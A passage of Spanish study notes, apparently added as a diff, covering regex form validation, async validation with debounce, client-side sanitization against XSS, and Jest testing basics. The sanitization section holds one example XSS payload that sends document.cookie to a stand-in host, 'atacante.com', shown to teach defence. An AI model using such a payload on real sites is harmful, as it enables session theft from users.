+Es esencialmente un lenguaje en miniatura para describir y hacer coincidir conjuntos de cadenas de texto.
+
+En validación client-side responde: "¿Esta cadena de texto coincide exactamente con el formato que necesito?"
+Ej: validar un código que debe ser una letra, seguida de tres dígitos
+Cadena Válida: A123, C789
+Patrón RegEx: `/^[A-Z]\d{3}$/`
+
+Es crucial porque las validaciones básicas de HTML5 (type="email", minlength) son limitadas
+Permite aplicar reglas complejas de lógica de negocio o formato.
+
+Casos de uso:
+ 
+1. Contraseñas Fuertes:
+Fuerza la inclusión de mayúsculas, minúsculas, números y símbolos.
+minlength solo verifica la longitud, no el contenido.
+
+2. Códigos Postales/ISBN:
+Asegura un formato preciso (ej. 5 dígitos, guion, 4 dígitos).
+type="text" acepta cualquier texto.
+
+3. Moneda:
+Asegura el formato decimal correcto (ej. 1,000.00).
+type="number" acepta cualquier número.
+
+
+Implementación: 
+Dos formas principales
+
+1. Uso Declarativo en HTML5 (pattern Attribute)
+Esta es la forma más sencilla, ya que permite al navegador manejar el mensaje de error de forma automática.
+
+```
+<input 
+  type="text" 
+  pattern="^\d{4}$" 
+  title="Por favor, ingrese un PIN de 4 dígitos."
+  required
+>
+```
+
+pattern="...": Aquí se coloca la expresión regular (sin las barras / /).
+
+title="...": Es crucial.
+A menudo se muestra como el mensaje de error al usuario cuando la validación del patrón falla.
+
+
+2. Uso Programático
+##### Para validaciones dinámicas (al escribir), para mostrar mensajes de error personalizados o para usar RegEx en una lógica más compleja
+##### usas el método test() del objeto RegExp.
+
+```
+// 1. Definir el patrón (ej. una contraseña que requiere mayúsculas, minúsculas y un dígito)
+const patronContrasena = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$/;
+
+const inputUsuario = "MiContrasena123";
+
+if (patronContrasena.test(inputUsuario)) {
+  console.log("Contraseña válida.");
+} else {
+  // Lógica para mostrar el error personalizado
+  console.error("La contraseña no cumple con los requisitos.");
+}
+```
+
+
+Métodos de RegEx:
+Escribir tus propios patrones
+
+1. ^: Ancla de Inicio
+El patrón debe comenzar aquí.
+Crucial para la validación.
+`^A`
+Coincidencia con: Apple
+
+2. $: Ancla de Fin
+El patrón debe terminar aquí
+Crucial para la validación.
+`a$`
+Coincidencia con: data
+
+3. \d: Clase de Carácter
+Coincide con cualquier dígito (0-9).
+`\d{3}`
+123
+
+4. \w: Clase de Carácter
+Coincide con cualquier carácter de palabra 
+`(a-z, A-Z, 0-9, _)`
+`\w+`
+nombre_1
+
+5. .: Metacaracter
+Coincide con cualquier carácter (excepto salto de línea).
+`a.b`
+a-b, a!b
+ 
+6. {n}: Cuantificador
+Coincide exactamente n veces.
+`\d{5}`
+12345
+
+7. {n,m}: Cuantificador
+Coincide entre n y m veces.
+`\w{6,10}`
+De 6 a 10 caracteres de palabra.
+
+8. +: Cuantificador
+Coincide una o más veces.
+`\d+`
+1, 1234
+
+9. `*`: Cuantificador
+Coincide cero o más veces.
+`a*b`
+b, ab, aaab
+
+10. `[]`: Conjunto
+Define un conjunto de caracteres permitidos.
+`[abc]`
+Solo a, b, o c.
+
+ 
+Importancia de las Anclas (^ y $):
+##### Para la validación, siempre debes usar las anclas ^ y $ para asegurar que toda la cadena coincida con tu patrón, y no solo una subcadena dentro de ella.
+
+Sin Anclas (MALO para validación):
+`/A\d+/`
+coincide con "HolaA123Mundo".
+
+Con Anclas (BUENO para validación):
+`/^A\d+$/`
+solo coincide con "A123" y rechaza "HolaA123Mundo".
+
+
+
+## Validación más compleja y seguridad.
+
+1. Validación Asíncrona:
+Casos de uso: Verificar la disponibilidad de un nombre de usuario o correo electrónico en la base de datos antes de enviar el formulario final
+Implementación usando Promesas o async/await.
+
+2. Saneamiento (Sanitization) de Datos:
+Diferencia clave entre Validación (¿Es válido?) y Saneamiento (¿Es seguro modificarlo?).
+Prevención de XSS (Cross-Site Scripting): Eliminación de etiquetas peligrosas (<script>, <iframe>) del input del usuario (ej. usando la biblioteca DOMPurify).
+Inyección SQL: Uso de consultas parametrizadas (esto suele manejarse a nivel del controlador de la base de datos/ORM, pero es crucial). 
+
+
+### Validación Asíncrona en Cliente
+
+##### Verificar la validez de un input de usuario cuando la comprobación requiere una llamada al servidor o alguna operación de larga duración.
+A diferencia de la validación síncrona (donde el resultado es inmediato), la validación asíncrona necesita tiempo para obtener una respuesta
+requiere manejar Promesas y el estado de carga.
+
+Verificar un campo de formulario que depende de datos externos
+que no están disponibles inmediatamente en el navegador.
+
+##### Tiene como dependencia a la db
+Si intentaras validar un nombre de usuario de forma síncrona, el navegador se congelaría mientras espera la respuesta de la API, lo cual es una pésima experiencia de usuario
+La validación asíncrona resuelve esto permitiendo que el navegador continúe interactuando mientras espera la respuesta.
+
+
+Flujo de validación asíncrona:
+
+##### El proceso sigue estos pasos en respuesta a un evento (blur, input con debounce):
+
+1. Evento y Debounce:
+El usuario modifica el campo.
+Se inicia un temporizador (debounce) para no saturar el servidor con peticiones por cada tecla pulsada.
+
+2. Estado de Carga (UI Feedback):
+Cuando el debounce expira, se inicia la llamada a la API
+y se muestra un indicador de carga (spinner) junto al campo.
+
+3. Llamada a la API:
+Se realiza una solicitud fetch o axios al endpoint del servidor
+(ej. /api/check-username?user=nombre).
+
+4. Respuesta y Manejo de Errores:
+
+Éxito (Válido): El servidor responde que el nombre de usuario está disponible.
+Se oculta el spinner y se muestra un icono de verificación verde.
+
+Fallo (Inválido): El servidor responde (ej. con código 409 Conflict) que el nombre de usuario está en uso.
+Se oculta el spinner y se muestra el mensaje de error.
+
+5. Bloqueo del Formulario:
+El formulario principal debe permanecer deshabilitado o en un estado de advertencia hasta que todas las validaciones asíncronas hayan finalizado con éxito.
+
+
+Ej con js:
+La implementación moderna se basa en Promesas y async/await.
+
+Función de Validación Asíncrona:
+
+```
+// La función debe devolver una Promesa
+async function verificarUsuarioDisponible(username) {
+  // 1. Mostrar spinner
+  mostrarSpinner('username'); 
+  
+  try {
+    const response = await fetch(`/api/check-user?user=${username}`);
+    
+    // 2. Manejar la respuesta del servidor
+    if (response.status === 409) {
+      // 409 Conflict: El recurso ya existe (está en uso)
+      return { isValid: false, message: 'Este nombre de usuario ya está tomado.' };
+    }
+    
+    // 200 OK: Nombre de usuario disponible
+    return { isValid: true };
+
+  } catch (error) {
+    // Manejar fallos de red o servidor
+    return { isValid: false, message: 'Error de conexión. Intente más tarde.' };
+  } finally {
+    // 3. Ocultar spinner (se ejecuta siempre)
+    ocultarSpinner('username');
+  }
+}
+```
+
+
+Uso del Debounce:
+Para evitar múltiples llamadas a la API mientras el usuario escribe rápidamente, se utiliza la técnica del debounce.
+
+```
+let debounceTimer;
+
+document.getElementById('username').addEventListener('input', (e) => {
+  clearTimeout(debounceTimer);
+  const username = e.target.value;
+  
+  // Esperar 500ms antes de llamar a la validación asíncrona
+  debounceTimer = setTimeout(async () => {
+    if (username.length > 3) {
+      const resultado = await verificarUsuarioDisponible(username);
+      // Actualizar la UI con el resultado (mostrar mensaje de error o check)
+      if (!resultado.isValid) {
+        mostrarErrorCampo('username', resultado.message);
+      } else {
+        mostrarExitoCampo('username');
+      }
+    }
+  }, 500);
+});
+```
+
+
+
+### Sanitización de Datos en Client-Side
+
+Práctica crítica de seguridad
+Limpiar y modificar el input del usuario
+asegurando que no contenga código malicioso o formatos no deseados antes de que sea procesado, enviado al servidor o, lo que es más importante, renderizado en el DOM.
+
+1. Sanitización vs. Validación
+
+Validación:
+##### ¿Es válido? ¿Coincide con el formato esperado?
+Acepta o rechaza el dato.
+Integridad de los datos.
+
+Sanitización:
+##### ¿Es seguro? ¿Contiene código malicioso?
+Modifica, limpia o elimina partes del dato.
+Seguridad (principalmente prevención de XSS).
+
+Ej: Si un usuario escribe $100.50 en un campo de precio
+Validación: Rechazaría el valor si espera solo números.
+Sanitización: Quitaría el símbolo $ para dejar solo 100.50.
+
+
+2. Motivo: Prevención de XSS
+
+Prevenir los ataques de Cross-Site Scripting (XSS).
+##### Un ataque XSS ocurre cuando un atacante inyecta código JavaScript malicioso (ej. usando etiquetas <script>, <iframe>, o manejadores de eventos como onload) en tu aplicación
+el cual luego es ejecutado por el navegador de otro usuario.
+
+Riesgo: Si permites que un usuario envíe el siguiente código en un campo de comentario y luego lo renderizas en la página sin sanitizarlo:
+
+```
+<p>Hola mundo!</p>
+<script>
+  // ¡Código malicioso robando cookies de sesión!
+  fetch('http://atacante.com/robar?cookie=' + document.cookie); 
+</script>
+```
+
+Si este código se inserta en el DOM, el navegador del siguiente usuario ejecutará el script malicioso.
+
+Solución: Eliminación de Etiquetas Peligrosas
+consiste en eliminar o neutralizar todas las etiquetas HTML que tienen el potencial de ejecutar código (como <script>, <style>, <iframe>, o atributos como onerror).
+
+
+3. Mecanismos de Sanitización en JS
+
+Generalmente, se desaconseja intentar sanitizar el código manualmente (por ejemplo, usando replace())
+ya que es muy fácil olvidar un caso de uso o una etiqueta peligrosa. 
+La mejor práctica es utilizar bibliotecas bien probadas.
+
+#### Uso de DOMPurify (Recomendado):
+Biblioteca estándar de la industria para la sanitización de HTML en el navegador.
+Toma una cadena de HTML potencialmente insegura
+La procesa utilizando el motor del navegador
+Solo devuelve el HTML limpio y seguro.
+
+```
+// Antes de renderizar HTML introducido por el usuario:
+import DOMPurify from 'dompurify';
+
+const inputInseguro = "<h1>Comentario</h1><script>alert('hackeado')</script>";
+
+// Sanitización: elimina la etiqueta <script>
+const outputLimpio = DOMPurify.sanitize(inputInseguro); 
+
+// outputLimpio ahora es: <h1>Comentario</h1>
+document.getElementById('comentario').innerHTML = outputLimpio;
+```
+
+
+#### Sanear para el Servidor (Remover Caracteres)
+
+##### Si la sanitización no es para HTML, sino para limpiar valores de input antes de enviarlos al servidor, puedes usar funciones simples de JavaScript:
+
+1. Moneda/Números:
+Remover caracteres no numéricos.
+`input.replace(/[^0-9.]/g, '')`
+
+2. Recortar Espacios:
+Remover espacios al inicio y al final.
+`input.trim()`
+
+3. Escapado HTML Básico:
+Reemplazar < y > por sus entidades HTML.
+`input.replace(/</g, '&lt;').replace(/>/g, '&gt;')` 
+
+
+##### Al igual que la validación, la sanitización del lado del cliente no es una garantía de seguridad.
+Un atacante puede sortear la sanitización del cliente
+##### el código que se va a persistir o almacenar en la base de datos DEBE SER SIEMPRE SANITIZADO Y VALIDADO EN EL LADO DEL SERVIDOR.
+
+La sanitización del cliente es principalmente una mejora de UX (para limpiar datos de formato antes del envío)
+y una capa de defensa adicional contra XSS que previene que código potencialmente malicioso toque tu DOM.
+
+
+
+# Testing
+
+## Fundamentos
+
+### 1. Pirámide de Pruebas
+Unitarias (más abajo, más rápidas, más numerosas).
+Integración (nivel intermedio).
+End-to-End (E2E) o UI (más arriba, más lentas, menos numerosas)
+
+Ayuda a la proporción, el alcance y la velocidad ideales de los diferentes tipos de pruebas en un proyecto
+Maximizar la confianza y la velocidad de feedback mientras se minimiza el costo y el tiempo de ejecución.
+
+Se divide en tres capas, ordenadas de abajo hacia arriba 
+
+1. Base (Nivel Inferior): Pruebas Unitarias (Unit Tests) 
+capa más grande de la pirámide y constituye la mayor parte de tu código de pruebas.
+Alcance: Prueba la unidad más pequeña de código de forma aislada (una función, un método, una clase).
+Velocidad: Rápidas (se ejecutan en milisegundos).
+##### Motivo de Uso: Asegurar que la lógica interna de cada pieza del sistema funciona correctamente, sin depender de la red o la base de datos.
+Herramientas Típicas: Jest, Mocha.
+
+2. Medio (Nivel Intermedio): Pruebas de Integración (Integration Tests)
+Esta capa es más pequeña que la base, pero sigue siendo robusta.
+Alcance: Prueba que diferentes unidades trabajen juntas correctamente
+ej. una función que se comunica con una base de datos simulada
+controlador que llama a un servicio
+o cómo dos componentes de UI se pasan datos
+Velocidad: Moderada (más lentas que las unitarias, ya que involucran más dependencias).
+Costo: Medio (más complejas de configurar y mantener).
+##### Motivo de Uso: Verificar que las interfaces y los contratos entre los componentes funcionen
+Herramientas Típicas: Supertest (Node.js), librerías de testing de frameworks de UI.
+
+3. Cúspide (Nivel Superior): Pruebas End-to-End (E2E) o UI Tests
+Esta es la capa más pequeña, reservada para los flujos de usuario más críticos.
+Alcance: Simula la experiencia completa del usuario final en un entorno lo más parecido posible a la producción
+(navegador real, servidor, base de datos). 
+Prueba el sistema de principio a fin.
+Velocidad: Lenta (dependen de la red, el rendering del navegador y el backend).
+Costo: Alto (frágiles, difíciles de depurar y mantener).
+##### Motivo de Uso: Asegurar que los flujos críticos de negocio, funcionen; Deben ser pocas y estratégicas
+ej. "Iniciar Sesión y Comprar un Producto"
+Herramientas Típicas: Cypress, Playwright, Selenium.
+
+
+##### La forma de la pirámide (muchas pruebas unitarias, pocas E2E) refleja la relación inversa entre velocidad/costo y realismo/alcance
+
+1. Velocidad: Las pruebas lentas (E2E) ralentizan el ciclo de desarrollo
+Las pruebas rápidas (Unitarias) dan feedback instantáneo al desarrollador.
+
+2. Aislamiento y Fiabilidad: Si una prueba E2E falla, es difícil saber dónde está el error
+Si una prueba Unitaria falla, sabes exactamente qué función rompió la lógica.
+
+3. Costo de Mantenimiento: Las pruebas E2E son caras y frágiles (cualquier cambio en la UI las rompe).
+Las Unitarias son baratas y más estables
+
+
+Anti-patrón: El "Cono de Helado":
+Donde hay muchas pruebas E2E lentas y pocas o ninguna prueba unitaria. 
+
+Esto lleva a:
+
+1. Desarrollo Lento: Los desarrolladores tienen que esperar horas para que el suite de pruebas termine.
+2. Alto Costo: Se gasta mucho tiempo manteniendo pruebas frágiles.
+3. Mala Localización de Errores: Cuando algo falla, la causa es difícil de identificar.
+
+##### La Pirámide de Pruebas asegura que los desarrolladores puedan confiar en las pruebas rápidas y baratas
+dejando las pruebas E2E solo para confirmar la experiencia general.
+
+
+
+### 2. Terminología Esencial:
+Test Runner: La herramienta que ejecuta las pruebas (ej. Jest, Mocha).
+Assertions (Aserciones): Declaraciones que verifican el resultado esperado (ej. expect(a).toBe(b)).
+Test Suite y Test Case: Organización de las pruebas (describe y it/test).
+
+
+#### Test Runner
+
+Ejecutor de Pruebas, software o framework que se encarga de automatizar, ejecutar y reportar los resultados de tus pruebas de código.
+Orquesta todo el proceso de testing.
+
+El Test Runner es el motor que impulsa tu suite de prueba
+Su trabajo es encontrar los archivos de prueba que has escrito
+Cargarlos y ejecutar el código de prueba línea por línea, y comunicar si cada prueba pasó o falló.
+
+Funciones: 
+
+1. Descubrimiento
+Localiza automáticamente todos los archivos de prueba en tu proyecto
+(generalmente basados en convenciones de nomenclatura como .test.js o .spec.js).
+
+2. Ejecución
+Ejecuta el código de prueba en un entorno controlado
+(a menudo imitando un navegador o el entorno Node.js).
+
+3. Aislamiento
+Ejecuta cada prueba en un entorno limpio para evitar que el resultado de una prueba afecte a otra.
+
+4. Reporte
+Muestra el resultado final en la consola
+(verde para éxito, rojo para fallo)
+genera resúmenes (ej. "100 pruebas ejecutadas, 98 pasaron, 2 fallaron").
+
+5. Observación (Watch Mode)
+Muchos Test Runners ofrecen el modo "vigilancia"
+vuelven a ejecutar automáticamente las pruebas cada vez que guardas un cambio en tus archivos de código
+
+
+Relación con el Code Base:
+
+##### El Test Runner actúa como el intermediario entre tu código de producción y tu código de prueba.
+
+1. Código de Producción: Las funciones que estás probando (ej. sumar(a, b)).
+2. Código de Prueba: El archivo donde escribes tus pruebas (ej. test('sumar', () => { expect(sumar(1, 2)).toBe(3); })).
+3. Test Runner: La herramienta que lee el código de prueba y llama a la función de producción, verificando las aserciones (expect).
+
+Ej: en JS el framework de pruebas a menudo incluye al Test Runner
+
+Jest: 
+##### Framework "todo en uno" que incluye el runner, la librería de aserciones (expect), herramientas integradas para mocking y cobertura de código
+
+Mocha:
+Test Runner más simple y flexible
+Requiere que integres librerías externas para las aserciones (ej. Chai) y el mocking (ej. Sinon).
+
+Vitest:
+Runner moderno y muy rápido, diseñado con la misma filosofía que Jest, pero optimizado para Vite y con un rendimiento superior.
+ 
+Cypress / Playwright:
+Aunque son principalmente herramientas de pruebas End-to-End (E2E)
+Contienen sus propios runners especializados para ejecutar pruebas en un navegador real o headless
+
+Comando: 
+`npm test`
+El Test Runner se activa para hacer que tu código de prueba cobre vida.
+
+
+#### Assertions 
+
+Parte práctica y legible de cualquier prueba de software.
+
+##### Una aserción es una declaración sobre el estado esperado de tu código
+##### Es la línea de código donde verificas si el resultado real de una operación coincide con el resultado que esperas que ocurra.
+##### una aserción es la pregunta de sí/no que tu prueba le hace al código, y es lo que determina si la prueba pasa o falla.
+
+
+Estructura: 
+
+Sigue un patrón como: 
+
+```
+expect(valor_real).toBe(valor_esperado)
+```
+
+##### expect(valor_real): Tomas el valor que tu código produjo
+##### toBe(valor_esperado): Usas un Matcher para comparar el valor real con el valor que debería haber sido.
+
+
+Matcher:
+
+##### Comparador es el corazón de la aserción, es el método que realiza la comparación
+Los frameworks de pruebas ofrecen una amplia variedad de matchers para manejar diferentes tipos de comprobaciones.
+
+Ej: matchers comunes en librerías como Jest
+
+1. .toBe():
+Comprueba si los valores son estrictamente iguales (usando ===).
+Se usa principalmente para valores primitivos
+(números, booleanos, strings).
+
+```
+expect(suma).toBe(5);
+```
+
+2. .toEqual():
+Comprueba si dos objetos o arrays tienen la misma estructura y valores internamente
+(es una igualdad profunda).
+Crucial para objetos.
+
+```
+expect(usuario).toEqual({id: 1, nombre: 'Ana'});
+```
+
+3. .toBeTruthy():
+Comprueba si el valor es truthy
+##### (algo que JavaScript considera verdadero).
+
+```
+expect(resultado).toBeTruthy();
+```
+
+3. .toBeFalsy():
+Comprueba si el valor es falsy
+(algo que JavaScript considera falso, como 0, null, undefined, '').
+
+```
+expect(error).toBeFalsy();
+```
+
+4. .toBeDefined():
+Comprueba si la variable no es undefined.
+
+```
+expect(fecha).toBeDefined();
+```
+
+5. .toHaveLength():
+Comprueba la longitud de un array o string.
+
+```
+expect(lista).toHaveLength(3);
+```
+
+6. .toContain():
+Comprueba si un array contiene un elemento específico.
+
+```
+expect(nombres).toContain('Pedro');
+```
+
+7. .toThrow():
+Comprueba si una función lanza un error (excepción) cuando se ejecuta.
+
+```
+expect(() => funcionInvalida()).toThrow();
+```
+
+
+Ej Aserciones:
+Imagina que tienes una función síncrona filtrar que toma un array de usuarios y devuelve solo los activos.
+
+```
+// Código de Producción:
+function filtrarActivos(usuarios) {
+  return usuarios.filter(u => u.activo === true);
+}
+
+// Código de Prueba (usando Aserciones):
+test('debe devolver solo usuarios activos', () => {
+  const usuarios = [
+    { id: 1, activo: true },
+    { id: 2, activo: false },
+    { id: 3, activo: true },
+  ];
+  
+  const activos = filtrarActivos(usuarios);
+
+  // Aserción 1: Comprueba la longitud del resultado (2)
+  expect(activos).toHaveLength(2); 
+
+  // Aserción 2: Comprueba que el resultado es un array de objetos con los valores esperados
+  expect(activos).toEqual([
+    { id: 1, activo: true },
+    { id: 3, activo: true },
+  ]);
+  
+  // Aserción 3: Comprueba que el resultado contiene un ID específico (1)
+  expect(activos.map(u => u.id)).toContain(1);
+});
+```
+
+##### En este ejemplo, la prueba solo pasará si TODAS las aserciones son exitosas
+##### Si, por ejemplo, filtrarActivos devolviera un usuario inactivo, la aserción .toHaveLength(2) o .toEqual([...]) fallaría, y el Test Runner reportaría el fallo.
+
+
+##### Las aserciones son el objetivo de cada prueba
+Sin ellas: 
+
+1. prueba no hace nada: El código de la prueba se ejecutaría, pero nunca verificaría si el resultado es correcto
+Si la función falla silenciosamente, la prueba seguirá "pasando".
+
+2. Reporte Inútil: El Test Runner no sabría qué informar
+Las aserciones le dicen al runner si debe mostrar el color verde ("Pass") o rojo ("Fail") y qué mensaje de error mostrar.
+
+
+#### Test Suite y Test Case
+
+Términos fundamentales utilizados para organizar y estructurar las pruebas en cualquier framework de testing
+Representan una jerarquía lógica que hace que tus pruebas sean legibles, mantenibles y fáciles de reportar.
+
+1. Test Case (Caso de Prueba)
+Es la unidad de prueba más pequeña y atómica
+Es un escenario de prueba individual que verifica una única pieza de funcionalidad o una condición específica
+
+Alcance: 
+Un Test Case se enfoca en un único resultado
+"Verificar que la función de suma devuelve el valor correcto para números positivos".
+
+##### Estructura: Típicamente consta de tres pasos (el patrón AAA: Arrange, Act, Assert):
+Arrange (Preparar): Configurar los datos de entrada.
+Act (Actuar): Ejecutar el código que se está probando.
+Assert (Aserción): Declarar si el resultado real coincide con el esperado (usando expect().toBe()).
+
+##### Sintaxis Común: Se define usando test() o it().
+
+
+2. Test Suite (Suite de Pruebas)
+Contenedor lógico que agrupa una colección de Test Cases relacionados.
+
+Alcance:
+Se enfoca típicamente en un componente, un módulo o una característica completa del sistema.
+Agrupa casos de prueba que interactúan con el mismo código.
+
+Propósito: Proporciona contexto
+##### Cuando ves el reporte de pruebas, la Suite te dice qué parte del sistema fue probada.
+
+Hooks:
+Las Suites a menudo definen hooks de configuración y limpieza
+(ej. beforeAll, afterEach) que se ejecutan antes o después de los casos de prueba dentro de esa Suite.
+
+##### Sintaxis Común: Se define usando describe().
+
+En el código: 
+La relación es jerárquica
+una Test Suite contiene uno o más Test Cases
+Esta organización refleja el código de producción.
+
+Ej: Módulo Calculadora.js
+
+Jerarquía	Elemento	Propósito	Sintaxis de Jest/Mocha
+
+Contenedor:
+Test Suite
+Prueba toda la funcionalidad de la Calculadora.
+`describe('Calculadora', ...)`
+
+Unidad:
+Test Case
+Prueba la función sumar con dos números positivos.
+`test('debe sumar dos números', ...)`
+
+Unidad:
+Test Case
+Prueba la función dividir entre cero (esperando un error).
+```
+test('debe lanzar error al dividir por cero', ...)
+```
+
+Ej de código testing
+
+```
+// La Suite de Pruebas: describe el módulo que estamos probando.
+describe('Validación de Usuario', () => { 
+    // Hooks: Se ejecuta una vez antes de todos los Test Cases en esta Suite.
+    beforeAll(() => {
+        // Inicializar una conexión a la base de datos de prueba
+    });
+
+    // Test Case 1: Prueba si la contraseña es demasiado corta.
+    test('debe fallar si la contraseña tiene menos de 8 caracteres', () => { 
+        // ARRANGE, ACT, ASSERT...
+        expect(validar('abc')).toBe(false); 
+    });
+
+    // Test Case 2: Prueba si el usuario existe.
+    test('debe devolver un error si el nombre de usuario ya está tomado', async () => { 
+        // ARRANGE, ACT, ASSERT...
+        await expect(registrarUsuario('admin')).rejects.toThrow('Usuario ya existe');
+    });
+    
+    // Test Case 3: Prueba el caso exitoso.
+    test('debe pasar con credenciales válidas', () => {
+        expect(validar('Usuario123')).toBe(true);
+    });
+});
+```
+
+##### La claridad en esta estructura te permite ejecutar solo las pruebas relevantes y comprender inmediatamente, al leer el reporte de la consola, qué funcionalidad ha fallado.
+
+
+
+### 3. Framework (ej. jest):
+Instalación y configuración
+Sintaxis básica: describe, test (o it), expect.
+
+#### Jest: 
+Se caracteriza por ser un framework de pruebas con "baterías incluidas".
+A diferencia de otros runners más simples (como Mocha), Jest integra todas las herramientas necesarias para escribir y ejecutar pruebas sin la necesidad de instalar dependencias adicionales.
+
+1. Componentes integrados
+
+Test Runner:
+Jest es el ejecutor. 
+Se encarga de encontrar, cargar y ejecutar tus pruebas, y de generar los reportes de éxito/fracaso.
+
+Aserciones (Matchers):
+Incluye su propia potente librería de aserciones (expect().toBe(), expect().toEqual(), etc.), conocida por ser muy expresiva y legible.
+
+Mocking y Spying:
+Incluye herramientas nativas y sencillas (jest.fn(), jest.mock()) para simular dependencias externas
+(como funciones, módulos o llamadas a API), manteniendo las pruebas aisladas.
+
+Cobertura de Código:
+Genera informes automáticos sobre qué porcentaje de tu código está cubierto por pruebas, sin necesidad de librerías de terceros (como Istanbul/nyc).
+
+
+Características:
+
+Velocidad y Rendimiento:
+Excepcionalmente rápido
+Utiliza el paralelismo para maximizar la velocidad:
+Ejecución en Paralelo: Ejecuta pruebas en archivos separados al mismo tiempo utilizando múltiples procesos (workers).
+Cache Inteligente: Solo vuelve a ejecutar las pruebas que están relacionadas con los archivos de código que has cambiado desde la última ejecución.
+
+Snapshots Testing (Pruebas de Instantáneas):
+Característica distintiva de Jest
+Especialmente útil para probar componentes de interfaz de usuario (UI) o estructuras de datos complejas.
+##### Captura el resultado actual de un componente (ej. la estructura HTML que renderiza) y lo guarda como un archivo de "instantánea" (.snap).
+Verificación: En ejecuciones futuras, compara el nuevo resultado con la instantánea guardada
+Si hay una discrepancia inesperada, la prueba falla, y el desarrollador debe aprobar el cambio intencional.
+
+
+Entornos de Prueba (Environments):
+
+Jest puede configurar diferentes entornos de ejecución:
+
+jsdom (por defecto):
+Simula el entorno del navegador
+(DOM, window, document) sin necesidad de lanzar un navegador real
+Esto es rápido e ideal para pruebas de componentes React/Vue/etc.
+
+node:
+Utilizado para probar código de backend o librerías que solo se ejecutan en Node.js.
+
+
+Configuración:
+A menudo solo una entrada en el archivo package.json.
+No necesitas preocuparte por integrarlo con Babel o Webpack, ya que lo maneja internamente
+
+
+Ej Matchers: 
+La sintaxis de Jest es muy declarativa y fácil de leer:
+
+```
+const calculadora = require('./calculadora');
+
+// Define la Test Suite
+describe('Pruebas de Suma', () => { 
+
+    // Define el Test Case
+    test('La suma de 1 + 2 debe ser 3', () => { 
+        const resultado = calculadora.sumar(1, 2);
+        
+        // La aserción: expect(valor_real).toBe(valor_esperado)
+        expect(resultado).toBe(3); 
+    });
+
+    // Otro Test Case
+    test('Debe lanzar un error si se pasa un string', () => {
+        // Usamos el matcher toThrow para verificar la excepción
+        expect(() => calculadora.sumar('a', 2)).toThrow(); 
+    });
+});
+```
+
+
+
+#### Describe: 
+Organización y el contexto de tus pruebas.
+Sirve para definir una Test Suite (Suite de Pruebas).
+
+1. Propósito: Agrupar y Contextualizar
+agrupar una colección de pruebas relacionadas, convirtiéndose en el contenedor lógico de tus Test Cases (test() o it()).
+
+Organización Estructural:
+describe() crea una jerarquía
+Cada describe() se utiliza para
+
+Un Módulo o Componente Completo:
+Ej: describe('Componente de Carrito de Compras').
+
+Clase o Función Específica:
+Ej: describe('Clase Usuario').
+
+Grupo de funciones relacionadas: 
+describe('Manejo de Errores de API').
+
+
+Contexto en el Reporte:
+Los nombres que introduces en describe() se usan para dar contexto al reporte de la consola
+Crucial cuando una prueba falla, ya que te dice exactamente qué parte del sistema falló.
+
+Ej: Reporte (sin y con describe):
+Sin describe: ✗ debe devolver 5
+##### Con describe: ✗ Componente de Carrito de Compras > al añadir 2 productos debe devolver 5
+
+
+2. Sintaxis y Parámetros
+describe() es muy simple y requiere dos argumentos
+
+name (string): Una cadena de texto que describe el grupo de pruebas
+(Ej. 'Módulo de Autenticación').
+
+##### fn (función): Una función callback que contiene todos los Test Cases (test() o it()) y potencialmente otros bloques describe() anidados
+
+```
+// Sintaxis básica
+describe(name, fn);
+```
+
+Ej: 
+
+```
+// Archivo: calculadora.test.js
+
+describe('Funciones Matemáticas Básicas', () => { // <--- Test Suite Principal
+    
+    // Test Case 1
+    test('sumar debe devolver el resultado correcto', () => {
+        expect(sumar(5, 3)).toBe(8);
+    });
+
+    // Test Case 2
+    test('restar debe devolver un número negativo si el segundo es mayor', () => {
+        expect(restar(5, 10)).toBe(-5);
+    });
+});
+```
+
+
+3. Hooks y Anidamiento
+
+Configuración de Hooks:
+##### describe() es el único lugar donde puedes definir Hooks (ganchos) de configuración y limpieza que se aplican a las pruebas dentro de esa suite
+
+beforeAll(fn): Se ejecuta una vez antes de todos los test() dentro de la describe() actual.
+(Ideal para inicializar una DB de prueba).
+
+beforeEach(fn): Se ejecuta antes de cada test() individual dentro de la describe() actual.
+(Ideal para reiniciar variables de estado).
+
+afterAll(fn) / afterEach(fn): Hacen lo opuesto a sus contrapartes before.
+
+
+Anidamiento de Bloques (Nested describe):
+
+Puedes anidar bloques describe() para crear una estructura de pruebas aún más detallada
+##### Es excelente para probar diferentes "estados" o "contextos" de un componente.
+
+```
+describe('Clase Cuenta Bancaria', () => { // Nivel 1: Clase
+    
+    // Hook que afecta a todos los tests en Nivel 1 y 2
+    beforeEach(() => { /* Configuración para cada prueba */ });
+
+    // Test Case del Nivel 1
+    test('debe inicializar el saldo en cero', () => { ... });
+
+    describe('cuando el saldo es insuficiente', () => { // Nivel 2: Contexto Específico
+        
+        // Test Case del Nivel 2
+        test('debe lanzar un error al intentar retirar', () => {
+            // ...
+        });
+        
+        // Test Case del Nivel 2
+        test('el saldo no debe cambiar después de un fallo', () => {
+            // ...
+        });
+    });
+});
+```
+
+Al anidar, el reporte de Jest combinará los nombres, resultando en algo como
+##### Clase Cuenta Bancaria > cuando el saldo es insuficiente > debe lanzar un error al intentar retirar
+Proporciona una claridad absoluta.
+
+
+#### Test: 
+Unidad fundamental para escribir cualquier prueba
+Representa un Test Case (Caso de Prueba) individual.
+
+1. Propósito: Prueba Individual
+Es definir un escenario específico para verificar una única pieza de funcionalidad o una condición de tu código.
+
+Definición de Test Case: Cada test() es un Caso de Prueba que se ejecuta de forma aislada.
+##### Si un test() falla, no afecta a la ejecución de otros test() en el mismo archivo.
+
+Contiene la Lógica AAA: El cuerpo de la función test() contiene los tres pasos críticos de cualquier prueba:
+
+##### 1. Arrange (Preparar): Inicializar datos, mocks y variables.
+##### 2. Act (Actuar): Ejecutar la función o el código que se está probando.
+##### 3. Assert (Aserción): Usar expect() y matchers para verificar el resultado.
+
+
+2. Sintaxis y Parámetros
+Requiere dos argumentos principales:
+
+name (string): Una cadena de texto que describe qué se está probando y cuál es el resultado esperado.
+Debe ser legible y claro, a menudo comenzando con verbos como "debe", "debería", o "no debe".
+
+fn (función): Una función callback donde resides el código real de la prueba, incluyendo la lógica AAA
+##### Esta función puede ser asíncrona (async/await) si la lógica a probar lo requiere. 
+
+```
+// Sintaxis básica
+test(name, fn); 
+// Alias
+it(name, fn);
+```
+
+Ej: 
+
+```
+const sumar = (a, b) => a + b;
+
+// Test Case Síncrono
+test('debe devolver la suma correcta de dos números positivos', () => {
+    // Act
+    const resultado = sumar(5, 7); 
+    
+    // Assert
+    expect(resultado).toBe(12);
+});
+```
+
+
